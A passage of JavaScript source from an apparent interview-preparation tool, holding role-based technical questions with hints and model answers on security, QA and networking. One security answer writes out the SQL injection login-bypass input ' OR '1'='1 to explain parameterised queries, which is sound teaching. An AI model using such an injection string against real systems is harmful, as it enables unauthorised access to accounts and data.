  const addQ = (item) => { if (!seenQs.has(item.q)) { seenQs.add(item.q); tech.push(item); } };

  // Role-based foundation questions
  if (rl.includes('software')||rl.includes('developer')||rl.includes('engineer')||rl.includes('backend')||rl.includes('frontend')||rl.includes('fullstack')||rl.includes('full stack')) {
    [
      { q:'Explain the difference between SQL and NoSQL databases and how you decide which to use.', hint:'SQL: ACID, structured, relational. NoSQL: flexible schema, horizontal scaling. Decision: data model, consistency needs, query patterns.' },
      { q:'What is RESTful API design? Walk me through its constraints and best practices.', hint:'Stateless, uniform interface, resource-based URLs, HTTP verbs, HATEOAS. Status codes: 200/201/400/401/404/422/500.' },
      { q:'How do you approach debugging a production bug you cannot reproduce locally?', hint:'Logs (structured logging), distributed tracing (Jaeger/Zipkin), adding observability, feature flags to isolate, canary deploys.' },
      { q:'Explain SOLID principles and give an example of each from your own code.', hint:'Single Responsibility, Open/Closed, Liskov Substitution, Interface Segregation, Dependency Inversion. Real examples score highest.' },
      { q:'What is the CAP theorem and how does it affect your architecture decisions?', hint:'Cannot have Consistency, Availability, and Partition Tolerance simultaneously. Most distributed systems choose CP or AP.' },
    ].forEach(addQ);
  }

  // Skill-specific questions
  skills.forEach(sk => {
    const skl = sk.toLowerCase();
    Object.entries(SKILL_QS).forEach(([key, qs]) => {
      if (skl.includes(key)) qs.forEach(addQ);
    });
  });

  // Fallback if still under 20
  if (tech.length < 10) {
    [
      { q:`How do you approach learning a completely new technology or language that is required for a project?`, hint:'Show a structured approach: official docs -> tutorial project -> build something real -> read source code. Mention a real example.' },
      { q:`Explain the concept of technical debt. How do you balance shipping fast vs. building it right?`, hint:'Technical debt is a deliberate tradeoff. Track it explicitly (backlog), quantify its cost, pay it down incrementally.' },
      { q:`What is your approach to code review - both when giving feedback and receiving it?`, hint:'Giving: specific, actionable, kind. Receiving: separate ego from code, treat it as learning. Agree on team standards to reduce friction.' },
      { q:`How do you write automated tests? What is the difference between unit, integration, and e2e tests?`, hint:'Unit: isolated function. Integration: multiple components together. E2E: full user flow. Use the testing pyramid as a guide.' },
      { q:`What does good documentation look like to you, and how do you approach writing it?`, hint:'Explain why, not just what. README: quick start, architecture decisions (ADRs), API contracts (OpenAPI), inline comments only for non-obvious logic.' },
      { q:`Describe a time you had to refactor a large legacy codebase. What was your approach?`, hint:'Understand before changing, add tests first, refactor in small increments, keep the system working throughout. Strangler Fig pattern.' },
      { q:`What is your preferred approach to monitoring and observability in production?`, hint:'Three pillars: logs, metrics, traces. Structured JSON logs, RED method (Rate/Errors/Duration), alerting on SLOs not arbitrary thresholds.' },
    ].forEach(addQ);
  }

  // ---------------------------------------------------------------------
  // ROLE-SPECIFIC  (deep questions for detected role)
  // ---------------------------------------------------------------------
  const roleSpecific = [];
  const addRS = (item) => roleSpecific.push(item);

  // Specific roles checked FIRST - before the broad "engineer" catch-all
  const isCyberSec    = rl.includes('security')||rl.includes('cyber')||rl.includes('infosec')||rl.includes('penetration')||rl.includes('pentest')||rl.includes('soc analyst')||rl.includes('vulnerability');
  const isQA          = rl.includes('qa ')||rl.includes('quality assurance')||rl.includes('test engineer')||rl.includes('sdet')||rl.includes('automation engineer')||rl.includes('tester')||rl.includes('quality engineer');
  const isNetwork     = rl.includes('network engineer')||rl.includes('network admin')||rl.includes('network architect')||rl.includes('networking');
  const isDataEng     = rl.includes('data engineer')||rl.includes('data pipeline')||rl.includes('etl')||rl.includes('data platform');
  const isCloud       = (rl.includes('cloud') && (rl.includes('engineer')||rl.includes('architect')))||rl.includes('aws engineer')||rl.includes('azure engineer')||rl.includes('gcp engineer')||rl.includes('solutions architect');
  const isDevOps      = rl.includes('devops')||rl.includes('sre')||rl.includes('site reliability')||rl.includes('infrastructure engineer')||rl.includes('platform engineer')||rl.includes('devsecops');
  const isDataSci     = rl.includes('data scientist')||rl.includes('machine learning engineer')||rl.includes('ml engineer')||rl.includes('ai engineer');
  const isDataAna     = rl.includes('data analyst')||rl.includes('business intelligence')||rl.includes('bi analyst')||rl.includes('analytics engineer');
  const isBA          = rl.includes('business analyst')||rl.includes('business analysis')||rl.includes('systems analyst')||rl.includes('functional analyst');
  const isPM          = rl.includes('product manager')||rl.includes('product owner')||rl.includes(' pm ')||rl.includes('program manager');
  const isDesign      = rl.includes('ux designer')||rl.includes('ui designer')||rl.includes('product designer')||rl.includes('ui/ux')||rl.includes('ux ');
  const isMktg        = rl.includes('marketing')||rl.includes('growth')||rl.includes('seo')||rl.includes('content');
  const isSales       = rl.includes('sales')||rl.includes('account executive')||rl.includes('business development');
  // Broad SWE last - only if no specific role matched
  const isSWE         = !isCyberSec&&!isQA&&!isNetwork&&!isDataEng&&!isCloud&&!isDevOps&&!isDataSci&&!isDataAna&&!isBA&&!isPM&&!isDesign&&!isMktg&&!isSales&&
                        (rl.includes('software')||rl.includes('developer')||rl.includes('engineer')||rl.includes('backend')||rl.includes('frontend')||rl.includes('fullstack')||rl.includes('full stack'));
  // Legacy aliases kept for the if-else chain below
  const isData        = isDataSci||isDataAna;

  if (isCyberSec) {
    [
      { q:`Walk me through the OWASP Top 10 - which do you consider the most critical today and why?`, hint:'Injection, Broken Auth, XSS, IDOR, Security Misconfiguration, Cryptographic Failures. SQL injection and broken access control are highest impact in 2024.', answer:`The OWASP Top 10 is my baseline for every security review. Currently I consider Broken Access Control the most critical - it topped the 2021 list and remains prevalent because access control enforcement is distributed across the entire codebase rather than in one place, making it easy to miss. A developer adds a new endpoint and forgets to attach the auth middleware; a resource ID is guessable and not ownership-checked. The impact is catastrophic: an attacker can read or modify any other user's data. Injection attacks - SQL, LDAP, OS command - remain critical despite being well-understood because legacy codebases and string concatenation still exist. Cryptographic Failures, formerly "Sensitive Data Exposure," is my third priority: applications still transmit passwords in plaintext, use MD5 for hashing, or expose PII in logs. I use the OWASP list as a review checklist during every security audit and include it in PR review guidelines for any endpoint that touches user data.` },
      { q:`Explain the difference between symmetric and asymmetric encryption. When do you use each?`, hint:'Symmetric: same key (AES, fast, key distribution problem). Asymmetric: public/private key pair (RSA, ECDSA, slow but solves key exchange). TLS uses both.', answer:`Symmetric encryption uses the same key for both encryption and decryption - AES-256 is the gold standard. It is fast and efficient for bulk data but has the key distribution problem: how do you securely share the secret key with the other party? Asymmetric encryption uses a public/private key pair - RSA, ECDSA, or modern Curve25519. Anyone can encrypt with the public key; only the private key holder can decrypt. This solves key distribution but is computationally expensive. In practice, TLS uses both: asymmetric encryption during the handshake to securely exchange a session key, then symmetric encryption for the rest of the connection using that session key. I use asymmetric cryptography for digital signatures, key exchange, and certificate-based authentication. I use symmetric encryption for at-rest data, session tokens, and any scenario where both parties already share a key through a secure channel.` },
      { q:`What is the CIA triad and how do you apply it in a real system design?`, hint:'Confidentiality (prevent unauthorised access), Integrity (prevent unauthorised modification), Availability (ensure system is accessible). Every security control maps to at least one.', answer:`The CIA triad provides a framework for thinking about security controls holistically. Confidentiality means only authorised parties access the data - I address this with encryption at rest and in transit, strict access control, least-privilege IAM policies, and data classification. Integrity means data is not modified without authorisation - I address this with digital signatures, checksums, audit logs, and database transaction guarantees. Availability means the system is accessible when needed - I address this with DDoS mitigation, rate limiting, redundancy, backups, and disaster recovery planning. When I evaluate a security control, I always ask which pillar it addresses. Some controls serve multiple pillars: MFA improves both confidentiality and integrity. When stakeholders push back on security investment, I frame it in CIA terms - the business understands "a breach means competitors see our customer list" better than they understand "CIA triad violation."` },
      { q:`What is the difference between a vulnerability assessment and a penetration test?`, hint:'VA: automated scan for known vulnerabilities (passive). Pentest: active exploitation attempt by a tester simulating an attacker. Both are complementary.', answer:`A vulnerability assessment identifies and catalogues known security weaknesses using automated scanners - tools like Nessus, Qualys, or OpenVAS compare the system against a database of known CVEs and misconfigurations. It is relatively fast, can be run frequently, and produces a broad list of issues ranked by severity. It does not confirm exploitability - a reported vulnerability may be mitigated by compensating controls the scanner cannot see. A penetration test goes further: a skilled human tester actively attempts to exploit vulnerabilities, chain them together, and gain unauthorised access, simulating a real attacker. A pentest confirms exploitability, discovers logical flaws and business logic vulnerabilities that scanners miss, and demonstrates real-world impact. I run vulnerability assessments regularly as continuous hygiene and commission penetration tests at least annually, before major architecture changes, or after significant new features are released. Both are necessary - vulnerability assessments provide breadth, pentests provide depth.` },
      { q:`How do you design a web application with security built in from the start?`, hint:'SAST/DAST in CI pipeline, threat modelling (STRIDE), input validation at boundaries, secrets management, CSP headers, dependency scanning.', answer:`Security by design starts in the threat modelling phase, not after build. I use STRIDE - Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege - to systematically identify threats for each component during architecture review. At the code level: all user input is validated and sanitised at the boundary; parameterised queries everywhere; no secrets in code or environment variables without a secrets manager; HTTPS-only with HSTS headers; Content Security Policy to prevent XSS; authentication using battle-tested libraries rather than custom implementations; session tokens are high-entropy and short-lived. In the CI pipeline I add SAST with CodeQL or Semgrep and dependency scanning with Dependabot or Snyk - every pull request gets a security scan before merge. I also implement proper error handling that never exposes stack traces or internal system details to end users. This is security as a continuous practice, not a final audit.` },
      { q:`Explain how TLS/HTTPS works and what certificate validation protects against.`, hint:'TLS handshake: server presents certificate, client verifies CA chain, key exchange via asymmetric crypto, session encrypted with symmetric key. Protects against MITM.', answer:`When a browser connects to an HTTPS site, a TLS handshake establishes a secure channel. The server sends its certificate, which contains its public key and is signed by a Certificate Authority the browser trusts. The browser verifies the certificate against its CA store, checks that the hostname matches, and verifies the chain of trust up to a root CA. Once the certificate is verified, the client and server agree on a cipher suite and use asymmetric cryptography to securely exchange a session key - typically via ECDHE, which provides forward secrecy. All subsequent communication is encrypted with symmetric AES using that session key. Certificate validation specifically protects against man-in-the-middle attacks: an attacker intercepting the connection cannot present a valid certificate for your domain without compromising a trusted CA. This is why certificate pinning is valuable for mobile apps - it rejects certificates even from legitimate CAs if they do not match the expected certificate.` },
      { q:`What is zero-trust security and how does it differ from traditional perimeter-based security?`, hint:'Never trust, always verify. No implicit trust based on network location. Micro-segmentation, strong identity, least privilege, continuous verification.', answer:`Traditional perimeter security assumes everything inside the corporate network is trusted and everything outside is hostile - the "castle and moat" model. If an attacker gets inside the perimeter through a phishing attack or a compromised VPN, they can move laterally with minimal resistance. Zero trust eliminates the concept of implicit trust based on network location. Every request is authenticated, every resource access is authorised, and trust is evaluated continuously rather than established once at login. In practice this means: strong identity verification for every user and device regardless of location; micro-segmentation so a compromised workstation cannot reach the database server; least-privilege access where permissions expire and are scoped to the minimum needed; continuous monitoring of behaviour patterns to detect anomalies. Cloud and hybrid work environments have accelerated zero-trust adoption because the perimeter no longer exists - employees access resources from anywhere on any device.` },
      { q:`How do you handle a security incident response when a breach is detected?`, hint:'PICERL: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned. Preserve evidence, communicate early, fix root cause.', answer:`My incident response follows the PICERL framework. Preparation means having a runbook, communication tree, and forensic tools ready before an incident happens. Identification is detecting and confirming the breach - correlating alerts from SIEM, endpoint detection, and logs. Containment is the immediate priority: isolate affected systems to prevent lateral movement and further data exfiltration without destroying evidence. I take memory dumps and preserve logs before any remediation. Eradication removes the attacker's access: revoke compromised credentials, patch the exploited vulnerability, remove malware. Recovery restores normal operations from clean backups with enhanced monitoring. Lessons Learned produces a blameless post-mortem within 48 hours: root cause, timeline, what worked, what failed, and specific preventive actions with owners and deadlines. Communication throughout matters as much as the technical response - stakeholders, legal, and depending on the data involved, regulators and affected users must be notified promptly.` },
      { q:`What is SQL injection and how do you prevent it? Give a real-world example.`, hint:'Unsanitised user input interpreted as SQL. Prevention: parameterised queries, prepared statements, ORMs. Never concatenate user input into SQL.', answer:`SQL injection occurs when user-supplied input is concatenated directly into a SQL query, allowing an attacker to modify the query's logic. The classic example: a login form that builds SELECT * FROM users WHERE username = '[input]' AND password = '[input]'. An attacker enters ' OR '1'='1 as the username, transforming the query into WHERE username = '' OR '1'='1', which returns all rows and bypasses authentication entirely. More dangerous variants can exfiltrate the entire database, drop tables, or execute OS commands. Prevention is simple and absolute: always use parameterised queries or prepared statements, where the SQL structure is fixed and user input is passed as typed parameters the driver handles safely. ORMs provide this by default for standard operations. The only risk is raw query methods within ORMs, which must be used carefully. Additionally, I apply least-privilege database credentials - the application user should not have DROP or admin privileges - as a second line of defence.` },
      { q:`Explain the difference between authentication and authorisation. How do you implement each securely?`, hint:'Authentication: who are you? Authorisation: what are you allowed to do? AuthN happens first, AuthZ on every resource access.', answer:`Authentication verifies identity - confirming that the user is who they claim to be. Authorisation determines what an authenticated identity is permitted to do. They are distinct concerns and implemented separately. For authentication, I use established standards: OAuth 2.0 and OIDC for third-party identity, TOTP-based MFA, bcrypt or Argon2id for password hashing with appropriate cost factors, short-lived JWTs with refresh token rotation, and secure session cookies with HttpOnly, Secure, and SameSite attributes. For authorisation, I implement RBAC - Role-Based Access Control - at a minimum, assigning permissions to roles rather than directly to users. For more granular control I use ABAC - Attribute-Based Access Control - which evaluates policies against resource attributes and user attributes at request time. The critical rule is to re-evaluate authorisation on every resource access, never trust client-side claims, and always check ownership: user A should not be able to access user B's resources by guessing the resource ID.` },
      { q:`How do you stay current with the evolving threat landscape and new vulnerabilities?`, hint:'CVE databases, NVD, SANS Internet Stormcast, vendor security bulletins, bug bounty write-ups, CTF competitions, OWASP updates.', answer:`I follow several sources as a daily practice. The NVD and CVE feeds give me raw vulnerability data; I filter for technologies I work with. Vendor security bulletins from AWS, GitHub, and framework maintainers flag critical issues relevant to my stack. SANS Internet Stormcast is a five-minute daily briefing on emerging threats. Bug bounty write-ups on HackerOne and Bugcrowd are invaluable - real attack chains against production systems teach me more than textbook descriptions. I also follow security researchers on technical platforms and read post-mortems from public breaches to understand how real incidents unfold. CTF competitions keep my practical skills sharp - you cannot know how to defend against something you do not understand how to exploit. Internally, I run monthly dependency audits and subscribe to CISA advisories for critical infrastructure threats. Staying current is not optional in security - the threat landscape changes faster than documentation catches up.` },
    ].forEach(addRS);
  } else if (isQA) {
    [
      { q:`Explain your testing strategy when you receive a new feature to test. Walk me through your process.`, hint:'Requirements analysis -> risk assessment -> test plan -> test cases (positive, negative, boundary) -> automation candidates -> execution -> reporting -> regression.', answer:`My testing process starts before a single test case is written. I read the requirements and immediately look for ambiguities, missing edge cases, and integration points with other features - these are usually where bugs hide. I build a risk assessment: what breaks if this feature fails? Who is affected? That shapes prioritisation. I then write test cases covering happy path, negative inputs, boundary values, and state combinations. I flag which cases are good automation candidates - anything repeatable, high-risk, or part of the regression suite. During exploratory testing I actively try to break the feature outside the documented scope: what happens with unexpected inputs, under load, with network delays, when a dependency is unavailable? I report bugs with reproducible steps, actual vs expected behaviour, environment details, and severity. After the release I verify the full regression suite passes. Finally I update the automation suite so this feature is covered in future regression runs.` },
      { q:`What is the difference between unit, integration, system, and acceptance testing?`, hint:'Unit: isolated function/class. Integration: components together. System: full application end-to-end. Acceptance: meets business requirements (UAT).', answer:`Unit tests verify a single function or class in isolation - all dependencies are mocked or stubbed. They are fast, deterministic, and give precise failure locations. Integration tests verify that multiple components work together correctly - a service calling a real database, or two microservices communicating. They are slower and more complex to set up but catch interface mismatches and contract violations that unit tests cannot. System tests validate the entire application end-to-end in an environment that mirrors production - a user-facing flow from browser through API through database and back. Acceptance tests (UAT) verify that the delivered system meets the business requirements and user expectations, typically performed by stakeholders or QA in a staging environment. I use the testing pyramid as a guide: many unit tests as the foundation, fewer integration tests, and a targeted set of E2E and acceptance tests at the top - because the cost of running and maintaining tests increases significantly at each level.` },
      { q:`How do you decide what to automate versus what to test manually?`, hint:'Automate: regression, smoke, repetitive, data-driven. Manual: exploratory, UX/usability, one-time, cases requiring human judgement.', answer:`The automation decision is a return-on-investment calculation. I automate test cases that will run many times: regression suites, smoke tests, every test that must be re-run on every build. I automate data-driven tests where the same logic must be verified with dozens of input combinations. I automate API tests, as they are stable and run fast without UI overhead. I keep manual testing for scenarios that require human judgment and cannot be meaningfully automated: exploratory testing where I am deliberately trying to find unknown bugs, usability and accessibility review, emotional response to UX, and any test whose setup cost exceeds its execution frequency. One-time release validation tests may not justify the automation investment unless the feature will be revisited. The anti-pattern I avoid is automating unstable, frequently-changing UI flows - they become maintenance burdens that slow the team down and generate false failures that erode trust in the suite.` },
      { q:`How do you handle flaky tests in a CI pipeline?`, hint:'Identify root cause (timing, shared state, network, test order dependencies). Quarantine, fix root cause, do not just increase retries. Track flakiness rate as a metric.', answer:`Flaky tests are a CI reliability crisis - they erode trust in the entire suite and cause teams to start ignoring failures. My approach is systematic. First, I identify flaky tests by tracking failure rates across multiple runs and tagging any test that fails intermittently without a code change. I quarantine them: move them to a separate job that does not block the build, so legitimate failures elsewhere are still caught. Then I diagnose each one. The most common causes are: timing dependencies (a test that assumes an async operation completes in a fixed time), shared mutable state between tests (one test's side effects break another), external service dependencies (real network calls in tests that should be mocked), and test order dependencies (tests that pass individually but fail when run in sequence). I fix the root cause rather than increasing retry counts - retries mask flakiness without addressing it. I track flakiness rate as an explicit team metric, because flaky tests above a threshold slow down development as much as any other technical debt.` },
      { q:`What is your approach to API testing? What do you test beyond happy-path responses?`, hint:'Contract testing, boundary inputs, error codes (4xx/5xx), auth/authz, rate limits, response schema validation, performance under load, idempotency.', answer:`API testing well beyond happy paths is where the most important bugs are found. My API test suite covers: contract validation - every response matches the declared schema, including optional fields being the correct type when present; error handling - invalid inputs return appropriate 4xx codes with useful error messages, not 500s with stack traces; authentication and authorisation - protected endpoints reject unauthenticated requests and return 403 (not 404) for forbidden resources; boundary values - maximum and minimum field lengths, zero values, empty arrays, null vs absent fields; idempotency - PUT and DELETE operations produce the same result when repeated; rate limiting - requests beyond the limit receive 429 with a Retry-After header; concurrency - simultaneous requests for the same resource do not create duplicate records or lost updates; and performance - response times remain acceptable under realistic load. I use tools like Postman/Newman for functional tests, k6 or Locust for load tests, and Pact for contract testing in microservices.` },
      { q:`Explain shift-left testing. How have you applied it in practice?`, hint:'Moving testing earlier in the development lifecycle. Requirements review, TDD, unit tests by developers, early integration testing, security scanning in CI.', answer:`Shift-left means integrating quality activities earlier in the development lifecycle rather than discovering defects at the end when they are expensive to fix. A bug found during requirements review costs orders of magnitude less than a bug found in production. In practice I have applied it in several ways: I participate in requirements and design reviews specifically to identify testability and missing edge case definitions before any code is written. I advocate for developers writing unit and integration tests as part of the definition of done, not as a separate phase. I add automated checks to the CI pipeline so every pull request gets linted, unit tested, and security-scanned before merge - making quality feedback immediate. For major features I do a test plan review before implementation begins, catching ambiguities early. This shifts the quality conversation from "did QA find any bugs?" to "did we build the right thing correctly?" - a much healthier position.` },
      { q:`What is BDD (Behaviour-Driven Development) and how does it improve collaboration between QA, Dev, and Product?`, hint:'Tests written in business language (Gherkin: Given/When/Then) that serve as both specifications and automated tests. Shared understanding reduces rework.', answer:`BDD is a collaborative development practice where requirements are expressed as concrete examples in a business-readable format - typically Gherkin syntax: Given a specific context, When an action occurs, Then an observable outcome results. These examples serve as both the specification and the automated test suite. The key benefit is shared understanding: when the product manager, developer, and tester all write and review the same Given/When/Then scenarios, they catch ambiguities and disagreements before any code is written. "The user successfully logs in" means different things to different people until it is expressed as specific scenarios. Tools like Cucumber, SpecFlow, or Behave execute these specifications as tests, ensuring the implemented behaviour matches the agreed specification. I have used BDD most effectively for user-facing flows and API contracts where miscommunication between roles was a recurring source of rework. The discipline of writing executable specifications forces precision that verbal requirements rarely achieve.` },
      { q:`How do you approach performance testing? What metrics do you target?`, hint:'Load testing (normal), stress testing (beyond capacity), soak testing (sustained load), spike testing. Metrics: response time P95/P99, throughput (RPS), error rate, CPU/memory.', answer:`Performance testing requires defining what "acceptable" means before running a single test - otherwise you have numbers but no conclusion. I work with the team to define SLOs: for example, P95 response time under 300ms at 500 concurrent users with an error rate below 0.1%. I then design several test types: load tests at expected peak concurrency to verify normal behaviour; stress tests that gradually increase beyond peak to find the breaking point; soak tests at sustained normal load for hours to catch memory leaks and connection pool exhaustion that only appear over time; and spike tests with sudden traffic bursts to verify the system recovers gracefully. I instrument with APM tools during tests to identify which component is the bottleneck - usually the database, external API calls, or unoptimised queries. Performance testing in CI is valuable for catching regressions: a baseline benchmark run on every main branch merge will alert when a code change degrades response time by more than 20%.` },
      { q:`What is test coverage and why is 100% code coverage not sufficient to guarantee quality?`, hint:'Coverage measures which lines/branches are executed by tests, not whether the tests assert meaningful outcomes. Tests can execute code without asserting correctness.', answer:`Test coverage measures what percentage of code is executed during test runs - line coverage, branch coverage, and path coverage are common variants. 100% coverage means every line was executed by at least one test, but it says nothing about what was verified. A test that calls a function and ignores the return value contributes to coverage without testing anything. It is trivially easy to write tests that achieve 100% coverage while asserting nothing meaningful. Coverage is a useful floor metric - if a critical path has 0% coverage, that is a clear risk. But it is not a ceiling metric. I target meaningful assertions on behaviour, especially for critical paths, error handling, and business logic. I complement coverage with mutation testing - tools like Stryker or PIT introduce deliberate code mutations and verify that your tests catch them - which measures test quality rather than just execution. Quality is about what you assert, not just what you execute.` },
      { q:`How do you test a distributed microservices system effectively?`, hint:'Contract testing (Pact), consumer-driven contracts, service virtualisation, chaos engineering, end-to-end tests on critical flows only, strong observability for debugging failures.', answer:`Testing distributed systems requires a layered strategy because the full system is too large and too slow to test end-to-end for every change. At the unit level, each service is tested in isolation with dependencies mocked. At the integration level, I use contract testing - Pact is my preferred tool - where each consumer defines the contract it expects from a provider, and both sides verify against that contract independently. This catches interface breaking changes without standing up the full system. Service virtualisation simulates unavailable dependencies realistically, allowing testing of failure and timeout scenarios. I reserve true end-to-end tests for a small number of critical user journeys, run in a shared staging environment, because they are slow and fragile. For observability-driven debugging, I ensure distributed tracing is in place - a failing E2E test with a trace ID makes root cause analysis tractable in a way it is not without it. Chaos engineering - deliberately killing services and injecting latency - validates that the system degrades gracefully.` },
    ].forEach(addRS);
  } else if (isNetwork) {
    [
      { q:`Walk me through the OSI model - explain each layer and give a real-world example of a protocol or technology at that layer.`, hint:'Physical, Data Link, Network, Transport, Session, Presentation, Application. Ethernet/L2, IP/L3, TCP-UDP/L4, HTTP-DNS/L7.', answer:`The OSI model provides a conceptual framework for understanding how data moves through a network. Layer 1 Physical handles the electrical or optical signals - Ethernet cables, fibre optic, Wi-Fi radio signals. Layer 2 Data Link handles node-to-node delivery within a network segment using MAC addresses - Ethernet frames, switches, ARP. Layer 3 Network handles logical addressing and routing between networks using IP addresses - IPv4, IPv6, routers, ICMP. Layer 4 Transport provides end-to-end delivery with reliability - TCP offers connection-oriented reliable delivery with retransmission; UDP offers connectionless fast delivery. Layer 5 Session manages connection establishment and teardown between applications. Layer 6 Presentation handles data translation, encryption, and compression - TLS/SSL, character encoding. Layer 7 Application provides network services to end-user applications - HTTP, DNS, SMTP, FTP. In practice I use this model for troubleshooting: "Is this a Layer 1 physical issue, Layer 3 routing problem, or Layer 7 application issue?" narrows the diagnostic scope immediately.` },
      { q:`Explain the difference between TCP and UDP. When would you choose each?`, hint:'TCP: reliable, ordered, connection-oriented (3-way handshake), slower. UDP: unreliable, connectionless, faster. Choose by reliability vs latency tradeoff.', answer:`TCP is connection-oriented - it establishes a connection via three-way handshake (SYN, SYN-ACK, ACK), guarantees ordered delivery, retransmits lost packets, and provides flow control and congestion control. This reliability comes at the cost of latency and overhead. UDP is connectionless - it sends packets without establishing a connection, with no delivery guarantee, no ordering, and no retransmission. The sender fires and forgets. I choose TCP for anything where data integrity and ordering matter: web traffic, file transfers, database connections, email. I choose UDP when low latency matters more than guaranteed delivery: video streaming, online gaming, VoIP, DNS lookups (where the client will just retry), and QUIC (which is UDP with reliability built at the application layer). The modern trend is UDP with application-level reliability - QUIC/HTTP3 uses this approach to eliminate TCP's head-of-line blocking while maintaining delivery guarantees for content that requires them.` },
      { q:`How does DNS resolution work, end-to-end? What happens when you type a URL in a browser?`, hint:'Browser cache -> OS cache -> Recursive resolver -> Root nameserver -> TLD nameserver -> Authoritative nameserver -> A record returned -> TCP connection -> HTTP request.', answer:`When a browser needs to resolve a hostname, it checks its own cache first, then the OS resolver cache. If not cached, the query goes to the configured recursive resolver - typically your ISP's or a public resolver like 8.8.8.8. If the resolver does not have it cached, it begins an iterative resolution. It asks a root nameserver which nameserver handles the TLD (e.g., .com). The root nameserver returns the address of the .com TLD nameserver. The resolver asks the TLD nameserver which nameserver is authoritative for the specific domain. Finally the resolver queries the authoritative nameserver for the domain and gets the A record (IPv4 address) or AAAA record (IPv6). The resolver caches the result per the TTL in the record and returns the IP to the client. The entire process typically takes 20-100ms on a cache miss and near-zero on a hit. TTL is critical for understanding cache propagation delays when changing DNS records.` },
      { q:`What is BGP and how does internet routing work at a high level?`, hint:'BGP: Border Gateway Protocol - the routing protocol of the internet. AS numbers, path attributes, route advertisements, policy-based routing between ISPs.', answer:`BGP - Border Gateway Protocol - is the routing protocol that holds the internet together. The internet is divided into Autonomous Systems (AS), each operated by an organisation (ISP, cloud provider, enterprise) with its own AS number. Within an AS, internal routing protocols like OSPF or IS-IS handle routing. BGP handles routing between ASes - it is the protocol that ISPs use to advertise which IP prefixes they can reach and at what cost. BGP is a path-vector protocol: each route advertisement includes the full AS path, which prevents routing loops. BGP routing decisions are policy-driven, not just shortest-path - operators apply route filters and prefer paths based on business relationships (customer > peer > transit). BGP is notorious for being powerful and dangerous: a single misconfigured AS advertising a prefix it does not own (BGP hijacking) can redirect internet traffic globally, which has happened with real consequences. Understanding BGP matters for anyone doing multi-cloud networking, SD-WAN design, or incident analysis involving internet connectivity.` },
      { q:`What is a VLAN and how does it improve network security and performance?`, hint:'Virtual LAN: logical segmentation of a physical network. Limits broadcast domains, isolates traffic, enforces security boundaries. 802.1Q tagging.', answer:`A VLAN creates a logically isolated network segment within a physical switch infrastructure. Without VLANs, every device on a switch can hear broadcast traffic from every other device, and there is no network-level separation between, say, HR, engineering, and guest Wi-Fi. VLANs solve both problems. By assigning ports to VLANs, broadcast traffic is contained within the VLAN - traffic from VLAN 10 is invisible to VLAN 20. This reduces broadcast storms and improves performance. More importantly, it creates security boundaries: guest devices physically plugged into the same switch as production servers cannot communicate with them at Layer 2. Inter-VLAN routing requires an explicit router or Layer 3 switch with firewall rules, enforcing access control. Trunk ports carry multiple VLANs using 802.1Q tagging - the VLAN ID is embedded in the frame header. In enterprise networks, VLANs are essential for PCI-DSS compliance (isolating cardholder data), separating IoT devices, and enforcing zero-trust micro-segmentation at the network layer.` },
      { q:`How do you troubleshoot a complete loss of network connectivity for a user?`, hint:'OSI layer approach: Physical (cable, port) -> Data Link (MAC, switch) -> Network (IP, route, gateway) -> Transport (firewall, port) -> Application (DNS, proxy).', answer:`I work up the OSI stack methodically. Layer 1 physical: is the cable connected, is the port showing link-up on the switch, are there physical errors? Layer 2 data link: is the device getting a MAC entry in the switch's ARP table, any port security violations or storm control triggers? Layer 3 network: does the device have a valid IP address and subnet mask, is the default gateway reachable via ping, does a traceroute show where packets stop? This tells me whether the problem is local or upstream. Layer 4 transport: if ping works but an application fails, is the specific port blocked by a firewall - I check the ACL rules and connection state tables. Layer 7 application: if connectivity works but a specific service fails, is DNS resolving correctly, is there a proxy or PAC file issue? I also check if the issue is isolated to one user or affects others - a single-user problem points to the endpoint; a group problem points to a switch, VLAN, or upstream routing issue. I document what I checked and eliminated at each step.` },
      { q:`Explain NAT and PAT. Why are they used and what are their limitations?`, hint:'NAT maps one IP to another. PAT (NAPT) maps many private IPs to one public IP using port tracking. Conserves IPv4 space but breaks true end-to-end connectivity.', answer:`NAT - Network Address Translation - maps IP addresses in packet headers as they pass through a router, most commonly translating private RFC 1918 addresses to public addresses. This was introduced primarily to conserve the IPv4 address space, allowing thousands of devices to share a single public IP. PAT - Port Address Translation, also called NAPT or masquerade - is the most common form: it maps multiple private IP:port combinations to a single public IP with different source ports, maintaining a state table to route return traffic to the correct internal host. Limitations are significant: NAT breaks the end-to-end connectivity principle of the internet - external hosts cannot initiate connections to internal devices, which complicates hosting services, P2P applications, VoIP, and some VPN protocols. Stateful NAT tables can be exhausted under high connection rates. NAT also complicates network troubleshooting because the original source IP is hidden. IPv6 eliminates the need for NAT by providing a massive address space, though NAT persists in IPv6 networks for policy reasons in some organisations.` },
      { q:`What is subnetting? Walk me through calculating subnets for a given address space.`, hint:'Subnet mask divides address into network and host portions. CIDR notation /prefix. Hosts = 2^(32-prefix) - 2. Subnetting divides address space into smaller networks.', answer:`Subnetting divides an IP address space into smaller, more manageable network segments. In CIDR notation, a /24 network like 192.168.1.0/24 has a 24-bit network portion and 8-bit host portion, giving 256 addresses with 254 usable hosts (subtracting network address and broadcast). To subnet this into four equal subnets, I need two additional bits for the subnet identifier - /26 gives four subnets each with 64 addresses and 62 usable hosts. The subnets are: 192.168.1.0/26, 192.168.1.64/26, 192.168.1.128/26, 192.168.1.192/26. When designing address allocation, I size subnets with room to grow: a subnet for 50 hosts should be at least /25 (126 hosts) to accommodate growth without re-addressing. I plan address space hierarchically: a large block for a data centre, subdivided by environment (prod/staging/dev), further subdivided by function (web/app/database tier). This hierarchical structure makes route summarisation, ACLs, and documentation significantly cleaner.` },
